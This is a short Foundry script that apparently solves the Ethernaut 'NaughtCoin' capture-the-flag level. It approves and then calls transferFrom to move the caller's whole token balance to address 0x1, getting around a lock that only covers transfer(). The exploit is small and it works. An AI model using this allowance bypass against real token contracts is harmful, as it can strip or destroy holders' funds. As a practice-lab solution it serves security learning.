// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Script} from "../lib/forge-std/src/Script.sol";
import {console} from "../lib/forge-std/src/console.sol";
import {ERC20} from "../lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

contract NaughtCoinScript is Script {
    function run() external {
        vm.startBroadcast();

        address levelContractAddress = 0x39f5655b212c93201aa2b5b317c6b64B80bB71Ea;
        ERC20 levelContract = ERC20(levelContractAddress);
        uint256 totalBalance = levelContract.balanceOf(msg.sender);
        levelContract.approve(msg.sender, totalBalance);
        levelContract.transferFrom(msg.sender, address(0x1), totalBalance);
        vm.stopBroadcast();
        console.log("balance left : ", levelContract.balanceOf(msg.sender));
    }
}
